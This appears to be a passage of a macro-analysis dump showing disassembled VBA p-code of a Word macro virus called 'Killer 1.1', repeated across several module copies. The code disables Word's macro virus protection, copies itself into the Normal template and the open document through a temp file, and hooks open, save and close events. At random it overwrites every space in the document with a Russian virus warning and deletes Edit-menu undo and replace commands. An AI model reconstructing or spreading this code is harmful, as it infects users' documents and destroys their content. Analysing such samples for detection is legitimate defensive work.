' 	FnInt 
' 	St c 
' Line #19:
' 	Ld c 
' 	LitDI2 0x0023 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) kill 0x0000 
' 	EndIf 
' Line #20:
' 	EndSub 
' Line #21:
' Line #22:
' 	FuncDefn (Sub HelpAbout())
' Line #23:
' 	OnError (Resume Next) 
' Line #24:
' 	ArgsCall (Call) killer 0x0000 
' Line #25:
' 	EndSub 
' Line #26:
' 	FuncDefn (Sub FileSave())
' Line #27:
' 	OnError (Resume Next) 
' Line #28:
' 	ArgsCall (Call) killer 0x0000 
' Line #29:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #30:
' 	EndSub 
' Line #31:
' 	FuncDefn (Sub FileSaveAs())
' Line #32:
' 	OnError (Resume Next) 
' Line #33:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #34:
' 	ArgsCall (Call) killer 0x0000 
' Line #35:
' 	EndSub 
' Line #36:
' 	FuncDefn (Sub AutoOpen())
' Line #37:
' 	OnError (Resume Next) 
' Line #38:
' 	ArgsCall (Call) killer 0x0000 
' Line #39:
' 	EndSub 
' Line #40:
' 	FuncDefn (Sub AutoClose())
' Line #41:
' 	OnError (Resume Next) 
' Line #42:
' 	ArgsCall (Call) killer 0x0000 
' Line #43:
' 	EndSub 
' Line #44:
' 	FuncDefn (Sub ToolsMacro())
' Line #45:
' 	OnError (Resume Next) 
' Line #46:
' 	ArgsCall (Call) killer 0x0000 
' Line #47:
' 	EndSub 
' Line #48:
' 	FuncDefn (Sub ViewVBCode())
' Line #49:
' 	OnError (Resume Next) 
' Line #50:
' 	ArgsCall (Call) killer 0x0000 
' Line #51:
' 	EndSub 
' Line #52:
' 	FuncDefn (Sub kill())
' Line #53:
' 	OnError (Resume Next) 
' Line #54:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #55:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #56:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #57:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #58:
' 	LitStr 0x0001 " "
' 	MemStWith Then 
' Line #59:
' 	LitStr 0x001B "На кампе обнаружен вирус!!!"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #60:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #61:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #62:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #63:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #64:
' 	LitVarSpecial (True)
' 	MemStWith MatchWholeWord 
' Line #65:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #66:
' 	EndWith 
' Line #67:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #68:
' 	LitStr 0x0015 "Undo VBA-Find.Execute"
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #69:
' 	LitStr 0x0011 "Repeat Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #70:
' 	LitStr 0x000A "Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #71:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #72:
' 	EndSub 
' Line #73:
' Line #74:
' 	FuncDefn (Private Sub autonew())
' Line #75:
' 	OnError (Resume Next) 
' Line #76:
' 	ArgsCall (Call) killer 0x0000 
' Line #77:
' 	EndSub 
' Macros/VBA/killer38 - 4763 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0014 "Killer 1.1 ©S&L 2000"
' Line #1:
' 	Dim (Const) 
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	VarDefn SluzhFile
' Line #2:
' 	FuncDefn (Sub killer())
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	ArgsCall Read 0x0000 
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #8:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #9:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #10:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #11:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #12:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #13:
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemSt New 
' Line #14:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #15:
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemSt New 
' Line #16:
' 	Label out 
' Line #17:
' 	Dim 
' 	VarDefn c (As Integer)
' Line #18:
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	St c 
' Line #19:
' 	Ld c 
' 	LitDI2 0x0023 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) kill 0x0000 
' 	EndIf 
' Line #20:
' 	EndSub 
' Line #21:
' Line #22:
' 	FuncDefn (Sub HelpAbout())
' Line #23:
' 	OnError (Resume Next) 
' Line #24:
' 	ArgsCall (Call) killer 0x0000 
' Line #25:
' 	EndSub 
' Line #26:
' 	FuncDefn (Sub FileSave())
' Line #27:
' 	OnError (Resume Next) 
' Line #28:
' 	ArgsCall (Call) killer 0x0000 
' Line #29:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #30:
' 	EndSub 
' Line #31:
' 	FuncDefn (Sub FileSaveAs())
' Line #32:
' 	OnError (Resume Next) 
' Line #33:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #34:
' 	ArgsCall (Call) killer 0x0000 
' Line #35:
' 	EndSub 
' Line #36:
' 	FuncDefn (Sub AutoOpen())
' Line #37:
' 	OnError (Resume Next) 
' Line #38:
' 	ArgsCall (Call) killer 0x0000 
' Line #39:
' 	EndSub 
' Line #40:
' 	FuncDefn (Sub AutoClose())
' Line #41:
' 	OnError (Resume Next) 
' Line #42:
' 	ArgsCall (Call) killer 0x0000 
' Line #43:
' 	EndSub 
' Line #44:
' 	FuncDefn (Sub ToolsMacro())
' Line #45:
' 	OnError (Resume Next) 
' Line #46:
' 	ArgsCall (Call) killer 0x0000 
' Line #47:
' 	EndSub 
' Line #48:
' 	FuncDefn (Sub ViewVBCode())
' Line #49:
' 	OnError (Resume Next) 
' Line #50:
' 	ArgsCall (Call) killer 0x0000 
' Line #51:
' 	EndSub 
' Line #52:
' 	FuncDefn (Sub kill())
' Line #53:
' 	OnError (Resume Next) 
' Line #54:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #55:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #56:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #57:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #58:
' 	LitStr 0x0001 " "
' 	MemStWith Then 
' Line #59:
' 	LitStr 0x001B "На кампе обнаружен вирус!!!"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #60:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #61:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #62:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #63:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #64:
' 	LitVarSpecial (True)
' 	MemStWith MatchWholeWord 
' Line #65:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #66:
' 	EndWith 
' Line #67:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #68:
' 	LitStr 0x0015 "Undo VBA-Find.Execute"
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #69:
' 	LitStr 0x0011 "Repeat Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #70:
' 	LitStr 0x000A "Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #71:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #72:
' 	EndSub 
' Line #73:
' Line #74:
' 	FuncDefn (Private Sub autonew())
' Line #75:
' 	OnError (Resume Next) 
' Line #76:
' 	ArgsCall (Call) killer 0x0000 
' Line #77:
' 	EndSub 
' Macros/VBA/killer39 - 5347 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0014 "Killer 1.1 ©S&L 2000"
' Line #1:
' 	Dim (Const) 
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	VarDefn SluzhFile
' Line #2:
' 	FuncDefn (Sub killer())
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	ArgsCall Read 0x0000 
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #8:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #9:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #10:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #11:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #12:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #13:
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemSt New 
' Line #14:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #15:
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemSt New 
' Line #16:
' 	Label out 
' Line #17:
' 	Dim 
' 	VarDefn c (As Integer)
' Line #18:
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	St c 
' Line #19:
' 	Ld c 
' 	LitDI2 0x0023 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) kill 0x0000 
' 	EndIf 
' Line #20:
' 	EndSub 
' Line #21:
' Line #22:
' 	FuncDefn (Sub HelpAbout())
' Line #23:
' 	OnError (Resume Next) 
' Line #24:
' 	ArgsCall (Call) killer 0x0000 
' Line #25:
' 	EndSub 
' Line #26:
' 	FuncDefn (Sub FileSave())
' Line #27:
' 	OnError (Resume Next) 
' Line #28:
' 	ArgsCall (Call) killer 0x0000 
' Line #29:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #30:
' 	EndSub 
' Line #31:
' 	FuncDefn (Sub FileSaveAs())
' Line #32:
' 	OnError (Resume Next) 
' Line #33:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #34:
' 	ArgsCall (Call) killer 0x0000 
' Line #35:
' 	EndSub 
' Line #36:
' 	FuncDefn (Sub AutoOpen())
' Line #37:
' 	OnError (Resume Next) 
' Line #38:
' 	ArgsCall (Call) killer 0x0000 
' Line #39:
' 	EndSub 
' Line #40:
' 	FuncDefn (Sub AutoClose())
' Line #41:
' 	OnError (Resume Next) 
' Line #42:
' 	ArgsCall (Call) killer 0x0000 
' Line #43:
' 	EndSub 
' Line #44:
' 	FuncDefn (Sub ToolsMacro())
' Line #45:
' 	OnError (Resume Next) 
' Line #46:
' 	ArgsCall (Call) killer 0x0000 
' Line #47:
' 	EndSub 
' Line #48:
' 	FuncDefn (Sub ViewVBCode())
' Line #49:
' 	OnError (Resume Next) 
' Line #50:
' 	ArgsCall (Call) killer 0x0000 
' Line #51:
' 	EndSub 
' Line #52:
' 	FuncDefn (Sub kill())
' Line #53:
' 	OnError (Resume Next) 
' Line #54:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #55:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #56:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #57:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #58:
' 	LitStr 0x0001 " "
' 	MemStWith Then 
' Line #59:
' 	LitStr 0x001B "На кампе обнаружен вирус!!!"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #60:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #61:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #62:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #63:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #64:
' 	LitVarSpecial (True)
' 	MemStWith MatchWholeWord 
' Line #65:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #66:
' 	EndWith 
' Line #67:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #68:
' 	LitStr 0x0015 "Undo VBA-Find.Execute"
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #69:
' 	LitStr 0x0011 "Repeat Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #70:
' 	LitStr 0x000A "Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #71:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #72:
' 	EndSub 
' Line #73:
' Line #74:
' 	FuncDefn (Private Sub autonew())
' Line #75:
' 	OnError (Resume Next) 
' Line #76:
' 	ArgsCall (Call) killer 0x0000 
' Line #77:
' 	EndSub 
' Macros/VBA/killer40 - 4763 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0014 "Killer 1.1 ©S&L 2000"
' Line #1:
' 	Dim (Const) 
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	VarDefn SluzhFile
' Line #2:
' 	FuncDefn (Sub killer())
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	ArgsCall Read 0x0000 
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #8:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #9:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #10:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #11:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #12:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #13:
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemSt New 
' Line #14:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #15:
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemSt New 
' Line #16:
' 	Label out 
' Line #17:
' 	Dim 
' 	VarDefn c (As Integer)
' Line #18:
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	St c 
' Line #19:
' 	Ld c 
' 	LitDI2 0x0023 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) kill 0x0000 
' 	EndIf 
' Line #20:
' 	EndSub 
' Line #21:
' Line #22:
' 	FuncDefn (Sub HelpAbout())
' Line #23:
' 	OnError (Resume Next) 
' Line #24:
' 	ArgsCall (Call) killer 0x0000 
' Line #25:
' 	EndSub 
' Line #26:
' 	FuncDefn (Sub FileSave())
' Line #27:
' 	OnError (Resume Next) 
' Line #28:
' 	ArgsCall (Call) killer 0x0000 
' Line #29:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #30:
' 	EndSub 
' Line #31:
' 	FuncDefn (Sub FileSaveAs())
' Line #32:
' 	OnError (Resume Next) 
' Line #33:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #34:
' 	ArgsCall (Call) killer 0x0000 
' Line #35:
' 	EndSub 
' Line #36:
' 	FuncDefn (Sub AutoOpen())
' Line #37:
' 	OnError (Resume Next) 
' Line #38:
' 	ArgsCall (Call) killer 0x0000 
' Line #39:
' 	EndSub 
' Line #40:
' 	FuncDefn (Sub AutoClose())
' Line #41:
' 	OnError (Resume Next) 
' Line #42:
' 	ArgsCall (Call) killer 0x0000 
' Line #43:
' 	EndSub 
' Line #44:
' 	FuncDefn (Sub ToolsMacro())
' Line #45:
' 	OnError (Resume Next) 
' Line #46:
' 	ArgsCall (Call) killer 0x0000 
' Line #47:
' 	EndSub 
' Line #48:
' 	FuncDefn (Sub ViewVBCode())
' Line #49:
' 	OnError (Resume Next) 
' Line #50:
' 	ArgsCall (Call) killer 0x0000 
' Line #51:
' 	EndSub 
' Line #52:
' 	FuncDefn (Sub kill())
' Line #53:
' 	OnError (Resume Next) 
' Line #54:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #55:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #56:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #57:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #58:
' 	LitStr 0x0001 " "
' 	MemStWith Then 
' Line #59:
' 	LitStr 0x001B "На кампе обнаружен вирус!!!"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #60:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #61:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #62:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #63:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #64:
' 	LitVarSpecial (True)
' 	MemStWith MatchWholeWord 
' Line #65:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #66:
' 	EndWith 
' Line #67:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #68:
' 	LitStr 0x0015 "Undo VBA-Find.Execute"
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #69:
' 	LitStr 0x0011 "Repeat Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #70:
' 	LitStr 0x000A "Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #71:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #72:
' 	EndSub 
' Line #73:
' Line #74:
' 	FuncDefn (Private Sub autonew())
' Line #75:
' 	OnError (Resume Next) 
' Line #76:
' 	ArgsCall (Call) killer 0x0000 
' Line #77:
' 	EndSub 
' Macros/VBA/killer41 - 5395 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0014 "Killer 1.1 ©S&L 2000"
' Line #1:
' 	Dim (Const) 
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	VarDefn SluzhFile
' Line #2:
' 	FuncDefn (Sub killer())
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	ArgsCall Read 0x0000 
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #8:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #9:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #10:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #11:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #12:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #13:
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemSt New 
' Line #14:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #15:
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemSt New 
' Line #16:
' 	Label out 
' Line #17:
' 	Dim 
' 	VarDefn c (As Integer)
' Line #18:
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	St c 
' Line #19:
' 	Ld c 
' 	LitDI2 0x0023 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) kill 0x0000 
' 	EndIf 
' Line #20:
' 	EndSub 
' Line #21:
' Line #22:
' 	FuncDefn (Sub HelpAbout())
' Line #23:
' 	OnError (Resume Next) 
' Line #24:
' 	ArgsCall (Call) killer 0x0000 
' Line #25:
' 	EndSub 
' Line #26:
' 	FuncDefn (Sub FileSave())
' Line #27:
' 	OnError (Resume Next) 
' Line #28:
' 	ArgsCall (Call) killer 0x0000 
' Line #29:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #30:
' 	EndSub 
' Line #31:
' 	FuncDefn (Sub FileSaveAs())
' Line #32:
' 	OnError (Resume Next) 
' Line #33:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #34:
' 	ArgsCall (Call) killer 0x0000 
' Line #35:
' 	EndSub 
' Line #36:
' 	FuncDefn (Sub AutoOpen())
' Line #37:
' 	OnError (Resume Next) 
' Line #38:
' 	ArgsCall (Call) killer 0x0000 
' Line #39:
' 	EndSub 
' Line #40:
' 	FuncDefn (Sub AutoClose())
' Line #41:
' 	OnError (Resume Next) 
' Line #42:
' 	ArgsCall (Call) killer 0x0000 
' Line #43:
' 	EndSub 
' Line #44:
' 	FuncDefn (Sub ToolsMacro())
' Line #45:
' 	OnError (Resume Next) 
' Line #46:
' 	ArgsCall (Call) killer 0x0000 
' Line #47:
' 	EndSub 
' Line #48:
' 	FuncDefn (Sub ViewVBCode())
' Line #49:
' 	OnError (Resume Next) 
' Line #50:
' 	ArgsCall (Call) killer 0x0000 
' Line #51:
' 	EndSub 
' Line #52:
' 	FuncDefn (Sub kill())
' Line #53:
' 	OnError (Resume Next) 
' Line #54:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #55:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #56:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #57:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #58:
' 	LitStr 0x0001 " "
' 	MemStWith Then 
' Line #59:
' 	LitStr 0x001B "На кампе обнаружен вирус!!!"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #60:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #61:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
